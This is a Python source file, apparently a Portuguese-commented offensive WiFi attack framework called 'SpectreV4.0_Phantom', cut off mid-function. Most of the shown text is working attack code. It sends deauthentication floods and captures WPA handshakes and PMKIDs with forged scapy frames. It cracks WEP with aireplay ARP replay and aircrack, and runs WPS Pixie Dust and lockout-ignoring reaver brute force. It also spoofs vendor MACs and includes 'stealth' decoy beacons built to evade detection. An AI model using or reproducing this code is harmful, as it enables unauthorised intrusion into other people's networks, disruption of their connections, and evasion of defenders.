#!/usr/bin/env python3

"""
SpectreV4.0_Phantom - Complete WiFi Penetration Framework

ATTACK VECTORS IMPLEMENTED:
✓ WPA/WPA2 Handshake Capture
✓ WEP Cracking (ARP Replay + Fragmentation)
✓ WPS PIN Bruteforce (Pixie Dust + Online Attack)
✓ Evil Twin (Fake AP with Captive Portal)
✓ Karma Attack (Auto-connect exploitation)
✓ PMKID Capture (Clientless attack)

PHANTOM ENHANCEMENTS:
✓ AI-Powered Target Selection
✓ Stealth Mode (Traffic Disguise)
✓ Adaptive Timing Engine
✓ Replay-Aware EAPOL Capture
✓ Ultra-Secure MAC Generation
✓ Enhanced Countermeasure Evasion

Author: Marina "Lich_Queen"
Version: 4.0_Phantom_Complete
Date: 2025-11-03
Lines: ~3600
"""

import os
import sys
import time
import json
import gzip
import random
import subprocess
import threading
import re
import atexit
import signal
import secrets
import tempfile
import shutil
import hashlib
import socket
import struct
import hmac
from datetime import datetime, timedelta
from pathlib import Path
from collections import defaultdict, deque
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# Scapy imports
try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11AssoReq, Dot11AssoResp, Dot11ProbeReq, Dot11ProbeResp, Dot11Deauth, RadioTap, EAPOL, Dot11AssoResp, Dot11ReassoReq
    from scapy.layers.l2 import ARP, LLC, SNAP
except ImportError:
    print("[!] Scapy não instalado. Execute: pip3 install scapy")
    sys.exit(1)

# Machine Learning
try:
    import numpy as np
    ML_AVAILABLE = True
except ImportError:
    ML_AVAILABLE = False
    print("[!] NumPy não disponível. Target selection ML desabilitado.")


# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    'version': '4.0_Phantom_Complete',
    'base_dir': os.path.expanduser('~/.spectre_phantom'),
    'captures_dir': os.path.expanduser('~/.spectre_phantom/captures'),
    'logs_dir': os.path.expanduser('~/.spectre_phantom/logs'),
    'temp_dir': os.path.expanduser('~/.spectre_phantom/temp'),
    'webroot_dir': os.path.expanduser('~/.spectre_phantom/webroot'),
    'log_file': os.path.expanduser('~/.spectre_phantom/logs/phantom.log'),
    'blacklist_file': os.path.expanduser('~/.spectre_phantom/blacklist.json'),
    'targets_db': os.path.expanduser('~/.spectre_phantom/targets.json'),
    'karma_ssids_file': os.path.expanduser('~/.spectre_phantom/karma_ssids.txt'),
    'max_retries': 3,
    'deauth_count': 15,
    'channel_hop_interval': 0.5,
    'capture_timeout': 120,
    'wep_packets_needed': 50000,
    'wps_pin_timeout': 300,
    'evil_twin_port': 8080,
    'stealth_mode': True,
    'ai_selection': True,
}


# ============================================================================
# CLEANUP HANDLER
# ============================================================================

class CleanupHandler:
    def __init__(self):
        self.original_interface = None
        self.monitor_interface = None
        self.temp_files = []
        self.processes = []
        self.servers = []
        
    def register_monitor(self, original, monitor):
        self.original_interface = original
        self.monitor_interface = monitor
        
    def register_temp_file(self, filepath):
        self.temp_files.append(filepath)
        
    def register_process(self, proc):
        self.processes.append(proc)
    
    def register_server(self, server):
        self.servers.append(server)
        
    def cleanup(self):
        print("\n[*] Executando cleanup...")
        
        # Shutdown servers
        for server in self.servers:
            try:
                server.shutdown()
            except:
                pass
        
        # Kill processos
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except:
                try:
                    proc.kill()
                except:
                    pass
        
        # Restaurar interface
        if self.monitor_interface:
            try:
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'], 
                             stderr=subprocess.DEVNULL)
                subprocess.run(['iw', self.monitor_interface, 'set', 'type', 'managed'],
                             stderr=subprocess.DEVNULL)
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'],
                             stderr=subprocess.DEVNULL)
                
                # Restart NetworkManager
                subprocess.run(['systemctl', 'start', 'NetworkManager'],
                             stderr=subprocess.DEVNULL)
            except:
                pass
        
        # Deletar temp files
        for tf in self.temp_files:
            try:
                if os.path.exists(tf):
                    os.remove(tf)
            except:
                pass
        
        print("[✓] Cleanup completo")

cleanup_handler = CleanupHandler()

def signal_handler(sig, frame):
    cleanup_handler.cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(cleanup_handler.cleanup)


# ============================================================================
# COLORED LOGGER
# ============================================================================

class ColoredLogger:
    COLORS = {
        'RED': '\033[91m',
        'GREEN': '\033[92m',
        'YELLOW': '\033[93m',
        'BLUE': '\033[94m',
        'MAGENTA': '\033[95m',
        'CYAN': '\033[96m',
        'WHITE': '\033[97m',
        'RESET': '\033[0m',
        'BOLD': '\033[1m'
    }
    
    def __init__(self, log_file):
        self.log_file = log_file
        self.lock = threading.Lock()
        
    def _write(self, level, msg, color='WHITE'):
        timestamp = datetime.now().strftime('%H:%M:%S')
        colored_msg = f"{self.COLORS[color]}[{level}]{self.COLORS['RESET']} {msg}"
        plain_msg = f"[{timestamp}] [{level}] {msg}"
        
        print(colored_msg)
        
        with self.lock:
            try:
                with open(self.log_file, 'a') as f:
                    f.write(plain_msg + '\n')
            except:
                pass
    
    def info(self, msg):
        self._write('*', msg, 'CYAN')
    
    def success(self, msg):
        self._write('✓', msg, 'GREEN')
    
    def warning(self, msg):
        self._write('!', msg, 'YELLOW')
    
    def error(self, msg):
        self._write('✗', msg, 'RED')
    
    def debug(self, msg):
        self._write('DEBUG', msg, 'MAGENTA')
    
    def progress(self, msg):
        self._write('→', msg, 'BLUE')


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def sanitize_ssid(ssid):
    """Sanitiza SSID contra injection"""
    if not ssid:
        return "hidden"
    safe = re.sub(r'[^\w\s\-.]', '', str(ssid))
    return safe[:32] if safe else "hidden"

def sanitize_filename(name):
    """Sanitiza nome de arquivo"""
    safe = re.sub(r'[^\w\s\-.]', '_', str(name))
    return safe[:200]

def generate_phantom_mac():
    """Gera MAC usando CSPRNG com OUI de vendor real"""
    common_ouis = [
        [0x00, 0x1A, 0x7D],  # Intel
        [0x00, 0x0C, 0x43],  # Ralink
        [0x00, 0x23, 0x6C],  # Qualcomm Atheros
        [0x00, 0x26, 0x5A],  # Broadcom
        [0xB8, 0x27, 0xEB],  # Raspberry Pi
        [0xDC, 0xA6, 0x32],  # Raspberry Pi Trading
        [0x00, 0x50, 0xF2],  # Microsoft
        [0x00, 0x0F, 0xB5],  # NetGear
    ]
    
    oui = secrets.choice(common_ouis)
    nic = [secrets.randbelow(256) for _ in range(3)]
    mac_bytes = oui + nic
    mac_bytes[0] = (mac_bytes[0] & 0b11111100) | 0b00000010
    
    return ':'.join(f'{b:02x}' for b in mac_bytes)

def atomic_write_json(filepath, data):
    """Escrita atômica de JSON"""
    fd, temp_path = tempfile.mkstemp(dir=os.path.dirname(filepath))
    try:
        with os.fdopen(fd, 'w') as f:
            json.dump(data, f, indent=2)
        os.chmod(temp_path, 0o600)
        shutil.move(temp_path, filepath)
    except:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        raise

def setup_secure_directories():
    """Cria diretórios com permissões seguras"""
    for dir_path in [CONFIG['base_dir'], CONFIG['captures_dir'], 
                     CONFIG['logs_dir'], CONFIG['temp_dir'], CONFIG['webroot_dir']]:
        os.makedirs(dir_path, mode=0o700, exist_ok=True)

def require_root():
    """Verifica privilégios root"""
    if os.geteuid() != 0:
        print("[✗] Este script requer privilégios root")
        print("[*] Execute com: sudo python3 SpectreV4.0_Phantom.py")
        sys.exit(1)

def check_dependencies(log):
    """Verifica dependências externas"""
    required = {
        'aircrack-ng': 'aircrack-ng',
        'hostapd': 'hostapd',
        'dnsmasq': 'dnsmasq',
        'reaver': 'reaver',
        'bully': 'bully (opcional para WPS)',
    }
    
    missing = []
    for cmd, package in required.items():
        if shutil.which(cmd) is None and cmd != 'bully':
            missing.append(package)
    
    if missing:
        log.warning(f"Dependências ausentes: {', '.join(missing)}")
        log.info("Instale com: sudo apt install " + ' '.join(missing))


# ============================================================================
# INTERFACE MANAGEMENT
# ============================================================================

def detect_wireless_interface():
    """Detecta interface wireless automaticamente"""
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        interfaces = re.findall(r'Interface (\w+)', result.stdout)
        
        if not interfaces:
            return None
        
        for iface in interfaces:
            iface_info = subprocess.run(['iw', iface, 'info'], 
                                       capture_output=True, text=True)
            if 'type managed' in iface_info.stdout or 'type monitor' in iface_info.stdout:
                return iface
        
        return interfaces[0] if interfaces else None
    except:
        return None

def ensure_monitor_mode(interface, log):
    """Garante que interface está em modo monitor"""
    try:
        result = subprocess.run(['iw', interface, 'info'], 
                              capture_output=True, text=True)
        
        if 'type monitor' in result.stdout:
            log.success(f"Interface {interface} já em modo monitor")
            return interface
        
        log.info(f"Configurando {interface} para modo monitor...")
        
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
        subprocess.run(['iw', interface, 'set', 'type', 'monitor'], check=True)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
        
        cleanup_handler.register_monitor(interface, interface)
        
        log.success(f"Modo monitor ativado em {interface}")
        return interface
        
    except Exception as e:
        log.error(f"Erro ao configurar monitor mode: {e}")
        return None

def kill_interfering_processes(log):
    """Mata processos que interferem com modo monitor"""
    interfering = ['NetworkManager', 'wpa_supplicant', 'dhclient', 'avahi-daemon']
    
    for proc_name in interfering:
        try:
            result = subprocess.run(['pgrep', proc_name], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                log.warning(f"Matando processo interferente: {proc_name}")
                subprocess.run(['pkill', proc_name], stderr=subprocess.DEVNULL)
        except:
            pass


# ============================================================================
# ADAPTIVE TIMING ENGINE
# ============================================================================

class AdaptiveTimingEngine:
    """Sistema de timing que imita comportamento humano"""
    def __init__(self):
        self.mean_delay = 0.065
        self.sigma = 0.25
        self.burst_probability = 0.15
        
    def get_next_delay(self):
        """Retorna próximo delay com padrão humano"""
        if not ML_AVAILABLE:
            return random.uniform(0.03, 0.15)
        
        base_delay = np.random.lognormal(np.log(self.mean_delay), self.sigma)
        
        if secrets.randbelow(100) < int(self.burst_probability * 100):
            base_delay *= 0.3
        
        return max(0.02, min(0.5, base_delay))


# ============================================================================
# REPLAY-AWARE EAPOL CAPTURE
# ============================================================================

class ReplayAwareCapture:
    """Rastreia replay counters de frames EAPOL"""
    def __init__(self):
        self.seen_counters = set()
        self.highest_counter = 0
        self.lock = threading.Lock()
        
    def validate_eapol_with_replay(self, pkt):
        """Valida EAPOL e verifica replay counter"""
        if not pkt.haslayer(EAPOL):
            return False
        
        try:
            raw = bytes(pkt[EAPOL])
            if len(raw) < 99:
                return False
            
            replay_counter = int.from_bytes(raw[9:17], 'big')
            
            with self.lock:
                if replay_counter <= self.highest_counter:
                    return False
                
                if replay_counter in self.seen_counters:
                    return False
                
                self.seen_counters.add(replay_counter)
                self.highest_counter = max(self.highest_counter, replay_counter)
            
            return True
            
        except Exception as e:
            return False
    
    def reset(self):
        """Reset para novo target"""
        with self.lock:
            self.seen_counters.clear()
            self.highest_counter = 0


# ============================================================================
# AI-POWERED TARGET SELECTOR
# ============================================================================

class IntelligentTargetSelector:
    """Usa features observáveis para prever probabilidade de sucesso"""
    def __init__(self):
        self.oui_reputation = {
            '00:1a:70': 0.85,
            '00:0c:41': 0.80,
            '00:50:f2': 0.75,
        }
        
    def score_target(self, target, log):
        """Calcula score de probabilidade de sucesso (0-1)"""
        if not CONFIG['ai_selection']:
            return 0.5
        
        try:
            score = 0.5
            
            signal = int(target.get('signal', -70))
            if signal > -50:
                score += 0.15
            elif signal > -60:
                score += 0.10
            elif signal < -75:
                score -= 0.10
            
            num_clients = len(target.get('clients', []))
            if num_clients > 5:
                score += 0.15
            elif num_clients > 2:
                score += 0.10
            elif num_clients == 0:
                score -= 0.20
            
            crypto = str(target.get('crypto', ''))
            if 'WPA2' in crypto and 'WPA3' not in crypto:
                score += 0.10
            if 'WEP' in crypto:
                score += 0.20
            if 'WPA3' in crypto:
                score -= 0.25
            
            if target.get('pmf'):
                score -= 0.15
            
            hour = datetime.now().hour
            if 9 <= hour <= 17:
                score += 0.05
            elif 0 <= hour <= 5:
                score -= 0.05
            
            bssid = target.get('bssid', '')
            oui = bssid[:8].lower()
            oui_score = self.oui_reputation.get(oui, 0.5)
            score += (oui_score - 0.5) * 0.2
            
            score = max(0.0, min(1.0, score))
            
            log.debug(f"Target {target.get('ssid', 'Unknown')} score: {score:.2f}")
            
            return score
            
        except Exception as e:
            log.error(f"Erro calculando score: {e}")
            return 0.5


# ============================================================================
# STEALTH MODE
# ============================================================================

class StealthTrafficGenerator:
    """Gera traffic legítimo para camuflar ataques"""
    def __init__(self, interface):
        self.interface = interface
        self.running = False
        self.thread = None
        
    def generate_fake_beacon(self, ssid, channel):
        """Gera beacon frame falso"""
        bssid = generate_phantom_mac()
        
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                     addr2=bssid, addr3=bssid)
        
        beacon = Dot11Beacon(cap='ESS+privacy')
        
        essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
        rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
        dsset = Dot11Elt(ID='DSset', info=chr(channel).encode())
        
        frame = RadioTap()/dot11/beacon/essid/rates/dsset
        
        return frame
    
    def start_background_noise(self, log):
        """Inicia geração de noise em background"""
        if not CONFIG['stealth_mode']:
            return
        
        def noise_loop():
            fake_ssids = ['Guest_WiFi', 'Mobile_Hotspot', 'Corporate_Net', 
                         'Home_Network', 'Public_WiFi']
            
            while self.running:
                try:
                    ssid = secrets.choice(fake_ssids)
                    channel = secrets.choice([1, 6, 11])
                    
                    frame = self.generate_fake_beacon(ssid, channel)
                    sendp(frame, iface=self.interface, verbose=False)
                    
                    time.sleep(random.uniform(1.0, 3.0))
                except:
                    pass
        
        self.running = True
        self.thread = threading.Thread(target=noise_loop, daemon=True)
        self.thread.start()
        log.info("Stealth mode ativo: gerando traffic noise")
    
    def stop(self):
        """Para geração de noise"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)


# ============================================================================
# CHANNEL MONITOR
# ============================================================================

class ChannelMonitor:
    def __init__(self, interface, log):
        self.interface = interface
        self.log = log
        self.current_channel = 1
        self.lock = threading.Lock()
        
    def set_channel(self, channel):
        with self.lock:
            try:
                subprocess.run(['iw', self.interface, 'set', 'channel', str(channel)],
                             stderr=subprocess.DEVNULL, check=True)
                self.current_channel = channel
                return True
            except:
                return False
    
    def get_channel(self):
        with self.lock:
            return self.current_channel


# ============================================================================
# PMF DETECTION
# ============================================================================

def has_pmf(pkt):
    """Detecta Protected Management Frames (802.11w)"""
    try:
        if pkt.haslayer(Dot11Elt):
            elt = pkt[Dot11Elt]
            while isinstance(elt, Dot11Elt):
                if elt.ID == 48:
                    if len(elt.info) >= 2:
                        capabilities = struct.unpack('<H', elt.info[-2:])[0]
                        if capabilities & 0x80:
                            return True
                elt = elt.payload
    except:
        pass
    return False

def has_wps(pkt):
    """Detecta WPS habilitado"""
    try:
        if pkt.haslayer(Dot11Elt):
            elt = pkt[Dot11Elt]
            while isinstance(elt, Dot11Elt):
                if elt.ID == 221:  # Vendor Specific
                    if b'\x00\x50\xf2\x04' in elt.info:  # WPS OUI
                        return True
                elt = elt.payload
    except:
        pass
    return False
# ============================================================================
# NETWORK SCANNER (ADVANCED)
# ============================================================================

class NetworkScanner:
    def __init__(self, interface, log):
        self.interface = interface
        self.log = log
        self.networks = {}
        self.lock = threading.Lock()
        self.channel_monitor = ChannelMonitor(interface, log)
        self.replay_tracker = ReplayAwareCapture()
        
    def packet_handler(self, pkt):
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            self._handle_beacon(pkt)
        elif pkt.haslayer(Dot11):
            self._handle_client(pkt)
    
    def _handle_beacon(self, pkt):
        try:
            bssid = pkt[Dot11].addr3
            
            ssid = None
            crypto = set()
            channel = None
            wps_enabled = False
            
            elt = pkt[Dot11Elt]
            while isinstance(elt, Dot11Elt):
                if elt.ID == 0:  # SSID
                    ssid = elt.info.decode('utf-8', errors='ignore')
                elif elt.ID == 3:  # DS Parameter set
                    channel = ord(elt.info)
                elif elt.ID == 48:  # RSN Information
                    crypto.add('WPA2')
                    if b'\x00\x0f\xac\x08' in elt.info:  # SAE
                        crypto.add('WPA3')
                elif elt.ID == 221:  # Vendor Specific
                    if b'\x00\x50\xf2\x01' in elt.info:  # WPA
                        crypto.add('WPA')
                    if b'\x00\x50\xf2\x04' in elt.info:  # WPS
                        wps_enabled = True
                
                elt = elt.payload
            
            # Check for WEP
            if pkt.haslayer(Dot11Beacon):
                cap = pkt[Dot11Beacon].cap
                if 'privacy' in cap and not crypto:
                    crypto.add('WEP')
            
            if not ssid:
                ssid = "<hidden>"
            
            if hasattr(pkt, 'dBm_AntSignal'):
                signal = pkt.dBm_AntSignal
            else:
                signal = -70
            
            pmf = has_pmf(pkt)
            
            with self.lock:
                if bssid not in self.networks:
                    self.networks[bssid] = {
                        'ssid': ssid,
                        'bssid': bssid,
                        'channel': channel,
                        'crypto': list(crypto) if crypto else ['Open'],
                        'signal': signal,
                        'clients': set(),
                        'pmf': pmf,
                        'wps': wps_enabled,
                        'first_seen': datetime.now(),
                        'last_seen': datetime.now(),
                        'beacon_count': 1
                    }
                else:
                    net = self.networks[bssid]
                    net['last_seen'] = datetime.now()
                    net['beacon_count'] += 1
                    if signal:
                        net['signal'] = signal
                    if wps_enabled:
                        net['wps'] = True
        except:
            pass
    
    def _handle_client(self, pkt):
        try:
            if pkt.addr1 and pkt.addr2:
                with self.lock:
                    for bssid, net in self.networks.items():
                        if bssid in [pkt.addr1, pkt.addr2]:
                            client = pkt.addr2 if pkt.addr1 == bssid else pkt.addr1
                            if client != bssid:
                                net['clients'].add(client)
        except:
            pass
    
    def scan(self, duration=30, channels=None):
        if channels is None:
            channels = list(range(1, 14))
        
        self.log.info(f"Iniciando scan por {duration}s nos channels: {channels}")
        
        start_time = time.time()
        channel_time = duration / len(channels)
        
        for channel in channels:
            if time.time() - start_time >= duration:
                break
            
            self.channel_monitor.set_channel(channel)
            self.log.progress(f"Scanning channel {channel}...")
            
            sniff(iface=self.interface, prn=self.packet_handler, 
                  timeout=channel_time, store=False)
        
        with self.lock:
            results = list(self.networks.values())
            for net in results:
                net['clients'] = list(net['clients'])
        
        self.log.success(f"Scan completo: {len(results)} redes encontradas")
        
        return results


# ============================================================================
# DEAUTH ATTACK
# ============================================================================

class DeauthAttacker:
    def __init__(self, interface, log):
        self.interface = interface
        self.log = log
        self.timing_engine = AdaptiveTimingEngine()
        
    def deauth_target(self, target_bssid, client_mac=None, count=15):
        """Envia deauth frames com timing adaptativo"""
        self.log.info(f"Enviando {count} deauth frames para {target_bssid}")
        
        if client_mac:
            clients = [client_mac]
        else:
            clients = ['ff:ff:ff:ff:ff:ff']
        
        for client in clients:
            for i in range(count):
                pkt1 = RadioTap() / Dot11(type=0, subtype=12, addr1=client,
                                         addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
                
                pkt2 = RadioTap() / Dot11(type=0, subtype=12, addr1=target_bssid,
                                         addr2=client, addr3=target_bssid) / Dot11Deauth(reason=7)
                
                sendp([pkt1, pkt2], iface=self.interface, verbose=False)
                
                delay = self.timing_engine.get_next_delay()
                time.sleep(delay)
        
        self.log.success(f"Deauth attack completo")


# ============================================================================
# WPA/WPA2 HANDSHAKE CAPTURE
# ============================================================================

class HandshakeCapture:
    def __init__(self, interface, target, log):
        self.interface = interface
        self.target = target
        self.log = log
        self.replay_tracker = ReplayAwareCapture()
        self.eapol_frames = []
        self.lock = threading.Lock()
        
    def packet_handler(self, pkt):
        if pkt.haslayer(EAPOL):
            if self.replay_tracker.validate_eapol_with_replay(pkt):
                with self.lock:
                    self.eapol_frames.append(pkt)
                    self.log.success(f"EAPOL frame capturado ({len(self.eapol_frames)}/4)")
    
    def has_complete_handshake(self):
        with self.lock:
            return len(self.eapol_frames) >= 4
    
    def capture(self, timeout=120):
        bssid = self.target['bssid']
        channel = self.target['channel']
        
        self.log.info(f"Capturando handshake do BSSID {bssid} (channel {channel})")
        
        subprocess.run(['iw', self.interface, 'set', 'channel', str(channel)],
                      stderr=subprocess.DEVNULL)
        
        deauther = DeauthAttacker(self.interface, self.log)
        
        def deauth_loop():
            for _ in range(3):
                time.sleep(5)
                if self.has_complete_handshake():
                    break
                deauther.deauth_target(bssid, count=10)
        
        deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
        deauth_thread.start()
        
        self.log.info(f"Aguardando EAPOL frames (timeout: {timeout}s)...")
        sniff(iface=self.interface, prn=self.packet_handler, 
              timeout=timeout, stop_filter=lambda x: self.has_complete_handshake())
        
        if self.has_complete_handshake():
            filename = f"handshake_{sanitize_filename(self.target['ssid'])}_{int(time.time())}.cap"
            filepath = os.path.join(CONFIG['captures_dir'], filename)
            
            with self.lock:
                wrpcap(filepath, self.eapol_frames)
            
            self.log.success(f"Handshake completo salvo em: {filepath}")
            return filepath
        else:
            self.log.error("Timeout: handshake não capturado")
            return None


# ============================================================================
# PMKID CAPTURE (Clientless Attack)
# ============================================================================

class PMKIDCapture:
    def __init__(self, interface, target, log):
        self.interface = interface
        self.target = target
        self.log = log
        self.pmkid_frame = None
        self.lock = threading.Lock()
        
    def packet_handler(self, pkt):
        """Captura PMKID de RSN IE em association response"""
        if pkt.haslayer(Dot11AssoResp) or pkt.haslayer(Dot11):
            try:
                if pkt.haslayer(Dot11Elt):
                    elt = pkt[Dot11Elt]
                    while isinstance(elt, Dot11Elt):
                        if elt.ID == 48:  # RSN Information
                            # PMKID está no final do RSN IE
                            if len(elt.info) > 20:
                                # Verifica se contém PMKID (tag 0xdd)
                                if b'\xdd' in elt.info:
                                    with self.lock:
                                        self.pmkid_frame = pkt
                                        self.log.success("PMKID capturado!")
                                    return
                        elt = elt.payload
            except:
                pass
    
    def has_pmkid(self):
        with self.lock:
            return self.pmkid_frame is not None
    
    def capture(self, timeout=60):
        """
        PMKID attack: envia association request, AP responde com PMKID
        Não requer clientes conectados
        """
        bssid = self.target['bssid']
        channel = self.target['channel']
        
        self.log.info(f"Capturando PMKID do BSSID {bssid} (clientless attack)")
        
        subprocess.run(['iw', self.interface, 'set', 'channel', str(channel)],
                      stderr=subprocess.DEVNULL)
        
        # Gera MAC cliente falso
        client_mac = generate_phantom_mac()
        
        def send_assoc_requests():
            """Envia association requests periodicamente"""
            for _ in range(20):
                if self.has_pmkid():
                    break
                
                # Association request
                dot11 = Dot11(type=0, subtype=0, addr1=bssid, 
                             addr2=client_mac, addr3=bssid)
                
                assoc_req = Dot11AssoReq(cap='ESS')
                
                essid = Dot11Elt(ID='SSID', info=self.target['ssid'].encode())
                rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
                
                # RSN IE para triggering PMKID
                rsn = Dot11Elt(ID=48, info=(
                    b'\x01\x00'  # Version
                    b'\x00\x0f\xac\x04'  # Group cipher: CCMP
                    b'\x01\x00\x00\x0f\xac\x04'  # Pairwise cipher: CCMP
                    b'\x01\x00\x00\x0f\xac\x02'  # AKM: PSK
                    b'\x00\x00'  # RSN Capabilities
                ))
                
                frame = RadioTap()/dot11/assoc_req/essid/rates/rsn
                
                sendp(frame, iface=self.interface, verbose=False)
                time.sleep(0.5)
        
        # Thread para enviar requests
        sender_thread = threading.Thread(target=send_assoc_requests, daemon=True)
        sender_thread.start()
        
        # Sniff responses
        sniff(iface=self.interface, prn=self.packet_handler, 
              timeout=timeout, stop_filter=lambda x: self.has_pmkid())
        
        if self.has_pmkid():
            filename = f"pmkid_{sanitize_filename(self.target['ssid'])}_{int(time.time())}.cap"
            filepath = os.path.join(CONFIG['captures_dir'], filename)
            
            with self.lock:
                wrpcap(filepath, [self.pmkid_frame])
            
            self.log.success(f"PMKID salvo em: {filepath}")
            return filepath
        else:
            self.log.error("Timeout: PMKID não capturado")
            return None


# ============================================================================
# WEP CRACKING
# ============================================================================

class WEPCracker:
    def __init__(self, interface, target, log):
        self.interface = interface
        self.target = target
        self.log = log
        self.packet_count = 0
        self.lock = threading.Lock()
        
    def packet_counter(self, pkt):
        """Conta packets WEP"""
        if pkt.haslayer(Dot11WEP):
            with self.lock:
                self.packet_count += 1
    
    def capture_ivs(self, duration=300):
        """Captura IVs para cracking WEP"""
        bssid = self.target['bssid']
        channel = self.target['channel']
        
        self.log.info(f"Capturando IVs de rede WEP: {bssid}")
        self.log.info(f"Alvo: {CONFIG['wep_packets_needed']} packets únicos")
        
        subprocess.run(['iw', self.interface, 'set', 'channel', str(channel)],
                      stderr=subprocess.DEVNULL)
        
        filename = f"wep_{sanitize_filename(self.target['ssid'])}_{int(time.time())}.cap"
        filepath = os.path.join(CONFIG['captures_dir'], filename)
        
        # Inicia captura com airodump-ng (mais eficiente para WEP)
        airodump_cmd = [
            'airodump-ng',
            '--bssid', bssid,
            '--channel', str(channel),
            '--write', filepath.replace('.cap', ''),
            '--output-format', 'pcap',
            self.interface
        ]
        
        proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL)
        cleanup_handler.register_process(proc)
        
        # ARP replay attack em thread separada
        def arp_replay_attack():
            time.sleep(10)  # Espera capturar alguns packets
            
            self.log.info("Iniciando ARP replay attack para acelerar captura...")
            
            aireplay_cmd = [
                'aireplay-ng',
                '--arpreplay',
                '--bssid', bssid,
                '--ignore-negative-one',
                self.interface
            ]
            
            arp_proc = subprocess.Popen(aireplay_cmd, stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL)
            cleanup_handler.register_process(arp_proc)
        
        arp_thread = threading.Thread(target=arp_replay_attack, daemon=True)
        arp_thread.start()
        
        # Monitora progresso
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                # Lê capture file para contar packets
                if os.path.exists(filepath.replace('.cap', '-01.cap')):
                    packets = rdpcap(filepath.replace('.cap', '-01.cap'))
                    wep_count = sum(1 for p in packets if p.haslayer(Dot11WEP))
                    
                    self.log.progress(f"IVs capturados: {wep_count}/{CONFIG['wep_packets_needed']}")
                    
                    if wep_count >= CONFIG['wep_packets_needed']:
                        self.log.success("IVs suficientes capturados!")
                        break
            except:
                pass
            
            time.sleep(10)
        
        proc.terminate()
        
        # Crack com aircrack-ng
        cap_file = filepath.replace('.cap', '-01.cap')
        if os.path.exists(cap_file):
            self.log.info("Iniciando cracking WEP com aircrack-ng...")
            
            aircrack_cmd = [
                'aircrack-ng',
                '-b', bssid,
                cap_file
            ]
            
            result = subprocess.run(aircrack_cmd, capture_output=True, text=True)
            
            # Parse key da output
            if 'KEY FOUND' in result.stdout:
                key_match = re.search(r'KEY FOUND! \[ ([A-F0-9:]+) \]', result.stdout)
                if key_match:
                    key = key_match.group(1)
                    self.log.success(f"WEP KEY ENCONTRADA: {key}")
                    return key
            else:
                self.log.error("Falha no cracking WEP (IVs insuficientes ou erro)")
        
        return None


# ============================================================================
# WPS ATTACK
# ============================================================================

class WPSAttacker:
    def __init__(self, interface, target, log):
        self.interface = interface
        self.target = target
        self.log = log
        
    def pixie_dust_attack(self):
        """
        Pixie Dust: explora weak random number generation em alguns APs
        Recupera PIN sem bruteforce
        """
        bssid = self.target['bssid']
        channel = self.target['channel']
        
        self.log.info(f"Tentando Pixie Dust attack contra {bssid}")
        
        subprocess.run(['iw', self.interface, 'set', 'channel', str(channel)],
                      stderr=subprocess.DEVNULL)
        
        # Reaver com pixie dust
        reaver_cmd = [
            'reaver',
            '-i', self.interface,
            '-b', bssid,
            '-K', '1',  # Pixie dust mode
            '-vv'
        ]
        
        try:
            result = subprocess.run(reaver_cmd, capture_output=True, text=True, 
                                   timeout=120)
            
            # Parse PIN e PSK
            if 'WPS PIN:' in result.stdout:
                pin_match = re.search(r'WPS PIN: (\d+)', result.stdout)
                psk_match = re.search(r'WPA PSK: (.*)', result.stdout)
                
                if pin_match:
                    pin = pin_match.group(1)
                    self.log.success(f"WPS PIN encontrado: {pin}")
                    
                    if psk_match:
                        psk = psk_match.group(1)
                        self.log.success(f"WPA PSK: {psk}")
                        return {'pin': pin, 'psk': psk}
                    
                    return {'pin': pin, 'psk': None}
            else:
                self.log.error("Pixie Dust falhou (AP não vulnerável)")
                
        except subprocess.TimeoutExpired:
            self.log.error("Pixie Dust timeout")
        except Exception as e:
            self.log.error(f"Erro no Pixie Dust: {e}")
        
        return None
    
    def online_bruteforce(self, timeout=300):
        """
        WPS PIN bruteforce online
        LENTO: ~10 horas para testar todos PINs
        Muitos APs implementam rate limiting
        """
        bssid = self.target['bssid']
        channel = self.target['channel']
        
        self.log.warning("WPS bruteforce online é MUITO lento (horas/dias)")
        self.log.warning("APs modernos têm rate limiting. Use apenas como último recurso.")
        
        response = input("Continuar com bruteforce? (y/N): ").strip().lower()
        if response != 'y':
            return None
        
        subprocess.run(['iw', self.interface, 'set', 'channel', str(channel)],
                      stderr=subprocess.DEVNULL)
        
        # Reaver bruteforce
        reaver_cmd = [
            'reaver',
            '-i', self.interface,
            '-b', bssid,
            '-vv',
            '-L',  # Ignore locks
            '-N',  # No NACKS
            '-d', '2'  # Delay entre tentativas
        ]
        
        self.log.info(f"Iniciando WPS bruteforce (timeout: {timeout}s)")
        
        try:
            proc = subprocess.Popen(reaver_cmd, stdout=subprocess.PIPE, 
                                   stderr=subprocess.STDOUT, text=True)
            cleanup_handler.register_process(proc)
            
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                line = proc.stdout.readline()
                if not line:
                    break
                
                # Log progresso
                if 'Trying pin' in line:
                    pin_match = re.search(r'Trying pin (\d+)', line)
                    if pin_match:
